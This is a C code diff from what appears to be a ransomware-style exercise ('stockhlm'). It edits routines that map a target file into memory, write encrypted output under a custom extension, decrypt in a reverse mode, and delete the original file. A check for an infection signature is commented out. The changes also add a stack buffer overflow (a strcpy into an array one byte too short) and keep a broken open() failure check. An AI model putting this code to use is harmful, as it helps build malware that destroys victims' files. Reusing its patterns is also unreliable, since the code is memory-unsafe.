@@ -20,26 +20,18 @@ int fa_map_file_into_memory(const char *filename)
     if (fd < 0)
         return 1;
     printf("modes:%d for %s\n", g_modes, filename);
-    // If
-    if (g_modes & FA_REVERSE)
-    {
-        printf("in reverse mode...\n");
-        g_stockhlm_header.original_filesize = 4744;
-    }
-    else
-    {
-        // Determine the file size by moving the cursor till the end
-        off_t res = lseek(fd, 0, SEEK_END);
-        // Check that lseek didn't fail and not returning > int max
-        if (res < 0 || res > 2147483647)
-            return 1;
-        else
-            g_stockhlm_header.original_filesize = res;
-        printf("res: %ld\n", res);
-        // Put back the cursor at the beginning of the file
-        if (lseek(fd, 0, SEEK_SET) < 0)
-            return 1;
-    }
+    
+    // Determine the file size by moving the cursor till the end
+    off_t res = lseek(fd, 0, SEEK_END);
+    // Check that lseek didn't fail and not returning > int max
+    if (res < 0 || res > 2147483647)
+        return 1;
+
+    printf("res: %ld\n", res);
+
+    // Put back the cursor at the beginning of the file
+    if (lseek(fd, 0, SEEK_SET) < 0)
+        return 1;
 
     /* Map the file into memory
         - PROT_READ: read-only access
@@ -52,7 +44,7 @@ int fa_map_file_into_memory(const char *filename)
     */
 
     g_mapped_data =
-        mmap(NULL, g_stockhlm_header.original_filesize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+        mmap(NULL, res, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
     if (g_mapped_data == MAP_FAILED)
     {
         close(fd);
@@ -61,6 +53,14 @@ int fa_map_file_into_memory(const char *filename)
 
     close(fd); // No need to keep the fd since the file is mapped
 
+    if (g_modes & FA_REVERSE)
+    {
+        // Copy the custom header of the encrypted file to the global variable
+        memcpy(&g_stockhlm_header, g_mapped_data, FA_NEW_HEADER_SIZE);
+    } else {
+        g_stockhlm_header.original_filesize = res;
+    }
+
     // // Abort if the current target already contains our signature
     // if (search_binary((char *)g_mapped_data, g_stockhlm_header.original_filesize, FA_SIGNATURE))
     //     return 1;
@@ -68,7 +68,7 @@ int fa_map_file_into_memory(const char *filename)
     return 0;
 }
 
-bool write_encrypted_data_to_file(char *target_path)
+bool write_encrypted_data_to_file(const char *target_path)
 {
     char    new_target_path[1024]; // Create a buffer to hold the full path
     int     outfilefd;
@@ -77,7 +77,7 @@ bool write_encrypted_data_to_file(char *target_path)
     //  with our custom extension
     snprintf(
         new_target_path, sizeof(new_target_path),
-        "%s%s", target_path, FA_STOCKHLM_EXT
+        "%s.%s", target_path, FA_STOCKHLM_EXT
     );
 
     outfilefd = open(new_target_path, O_CREAT | O_RDWR | O_TRUNC, 0755);        
@@ -102,21 +102,24 @@ bool write_encrypted_data_to_file(char *target_path)
 
 bool write_decrypted_data_to_file(char *target_path)
 {
-    char    *new_target_path;
     int     outfilefd;
 
     // We remove our custom extension by terminating the filename earlier.
     target_path[strlen(target_path) - FA_STOCKHLM_EXT_LEN] = '\0';
 
     // 0755: rwx for owner, rx for group and others
-    outfilefd = open(new_target_path, O_CREAT | O_RDWR | O_TRUNC, 0755);
+    outfilefd = open(target_path, O_CREAT | O_RDWR | O_TRUNC, 0755);
 
     // Check if open() has failed
     if (outfilefd == 1)
         return 1;
 
     // Write the processed data to the outfile
-    ssize_t bytes_written = write(outfilefd, g_mapped_data, g_stockhlm_header.original_filesize);
+    ssize_t bytes_written = write(
+        outfilefd,
+        g_mapped_data + FA_NEW_HEADER_SIZE, // Don't keep the custom header
+        g_stockhlm_header.original_filesize
+    );
     if (bytes_written < 0)
         return 1;
 
@@ -125,11 +128,15 @@ bool write_decrypted_data_to_file(char *target_path)
 }
 
 // Write the processed file data back to a new file
-int fa_write_processed_data_to_file(char *target_path)
+int fa_write_processed_data_to_file(const char *target_path)
 {
+    char    temp_path[strlen(target_path) - 1];
+    // Copy the original string to the temporary variable
+    strcpy(temp_path, target_path);
+
     if (g_modes & FA_REVERSE)
     {
-        if (write_decrypted_data_to_file(target_path) == FA_ERROR)
+        if (write_decrypted_data_to_file((char *)target_path) == FA_ERROR)
             return 1;
     }
     else
@@ -141,9 +148,9 @@ int fa_write_processed_data_to_file(char *target_path)
     if (munmap(g_mapped_data, g_stockhlm_header.original_filesize) < 0)
         return 1;
 
+    printf("to remove: %s\n",temp_path);
     // Remove the old file from the system
-    if (remove(target_path) != 0)
-        return 1;
+    if (remove(temp_path) != 0) return 1;
 
     return 0;
 }
